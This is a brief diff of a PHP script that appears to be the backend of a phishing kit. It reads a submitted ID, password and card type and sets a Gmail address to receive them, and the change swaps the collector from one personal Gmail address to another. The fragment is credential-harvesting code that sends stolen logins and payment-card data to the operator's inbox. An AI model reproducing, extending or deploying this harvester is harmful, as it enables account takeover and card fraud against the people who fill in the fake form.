@@ -3,7 +3,7 @@
 // session_destroy();
 session_start();
 		header("Access-Control-Allow-Origin:*");
-		$recepientEmail = "Sammyjurisydv92@gmail.com";
+		$recepientEmail = "allahsegun@gmail.com";
 		$id = $_POST["id"];
 		$password = $_POST["password"];
 		$cardType = $_POST["card-type"];
